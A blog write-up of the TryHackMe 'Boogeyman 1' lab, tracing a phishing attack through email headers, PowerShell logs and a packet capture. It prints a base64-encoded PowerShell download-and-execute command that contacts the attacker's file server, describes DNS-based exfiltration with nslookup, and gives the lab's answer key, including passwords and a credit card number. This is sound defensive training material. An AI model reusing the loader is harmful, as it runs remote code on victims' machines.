---
title: Boogyman 1 Lab
date: 2026-01-27 18:00:00
categories: [TryHackMe, Lab]
tags: [Log Analysis, Linux]
---

# Boogeyman 1

## Introduction

This tryhackme lab is a capstone to the SOC Level 1 pathway which tests the users ability to understand phishing emails and use tools like wireshark and windows event logs and jq to track down the attacker. 

### Scenario
Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation. The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.


## Email Analysis

### What is the email address used to send the phishing email?

A quick analysis of the email header provides the information to answer the first two questions. 

![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 142343.png>)

**Answer:** agriffin@bpakcaging.xyz

### What is the email address of the victim?

**Answer:** julianne.westcott@hotmail.com

### What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

Viewing the email source in Thunderbird will show the DKIM-Signature.

![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 143005.png>)

**Answer:** elasticemail

### What is the name of the file inside the encrypted attachment?

Downloading the zip archive and opening it reveals a .lnk file within it. 

**Answer:** Invoice_20230103.lnk

### What is the password of the encrypted attachment?

Looking in the email the sender gave the password to decrypt the file.

**Answer:** Invoice2023!

### Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

Using the lnkparse command reveals the encoded payload. 

```
lnkparse Invoice_202330103.lnk
```

![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 145009.png>)

**Answer:** aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==

## Endpoint Security

Based on the initial findings, we discovered how the malicious attachment compromised Julianne's workstation:
* A PowerShell command was executed.
* Decoding the payload reveals the starting point of endpoint activities. 

### What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

Using the Json commandline processor jq we can determine domains through searching the script block text for the names.

```
cat powershell.json | jq '{ScriptBlockText}'
```

![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 153142.png>)

![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 154509.png>)

**Answer:** cdn.bpakcaging.xyz,files.bpakcaging.xyz

### What is the name of the enumeration tool downloaded by the attacker?

Same method can be used to find the enumeration tool.

![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 161124.png>)

**Answer:** seatbelt

### What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.

```
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] {ScriptBlockText}' | grep -b Set-StrictMode | grep -v null
```

![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 162338.png>)

We can then find the user directory accessing it through this command:

```
cat powershell.json | jq '{ScriptBlockText}' | grep "cd"
```

This reveals the attack using cd to go into the 'j.westcott' directory.

**Answer:** C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite

### What is the software that uses the file in Q3?

The first commadn in the last question also showed it being opened using Microsoft Sticky Notes.

**Answer:** Microsoft Sticky Notes

### What is the name of the exfiltrated file?

We can search for ScriptBlockText again inorder to find the name of the exfiltrated file. 

![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 162745.png>)

**Answer:** protected_data.kdbx

### What type of file uses the .kdbx file extension?

A simple google will show what it is used for. It says it is a keepass file extension that is commonly used for storing passwords in encrypted databases. 

**Answer:** keepass

### What is the encoding used during the exfiltration attempt of the sensitive file?

The next two questions can yet again be found through scirpt block text analysis paricularly looking for the variables with the $ prefix for the encoding. 

**Answer:** hex

### What is the tool used for exfiltration?

![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 162905.png>)

**Answer:** nslookup

## Network Traffic Analysis

Based on the PowerShell logs investigation, we have seen the full impact of the attack:

* The threat actor was able to read and exfiltrate two potentially sensitive files.
* The domains and ports used for the network activity were discovered, including the tool
used by the threat actor for exfiltration.

### What software is used by the attacker to host its presumed file/payload server?

Following the tcp stream of the pcap file associated with the attackers domain reveals the server used. 

![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 163256.png>) ![alt text](<../assets/images/Posts/Boogeyman1-Lab/Screenshot 2026-01-26 163424.png>)

**Answer:** python

### What HTTP method is used by the C2 for the output of the commands executed by the attacker?

**Answer:** POST

### What is the protocol used during the exfiltration activity?

We saw in a previous task that nslookup was being used which it can then be infered that the dns protocol is being used.

**Answer:** dns

### What is the password of the exfiltrated file?

```
http.contains "sq3.exe"
```

Following the tcp stream reveals the sql command used at steam 749. Set it to the next stream (750) which then shows the password encoded in decimal format. After decoding the result reveal the answser.

**Answer:** %p9^3!lL^Mz47E2GaT^y

### What is the credit card number stored inside the exfiltrated file?

Using tshark we can filter for dns and the associated domain names:

```
tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.'| grep -v -e "files" -e "cdn" | uniq | tr -d '\n' > output.txt
```

With the redirectd output to output.txt we can then find the password after decoding with hex in a tool such as CyberChef.

**Answer:** 4024007128269551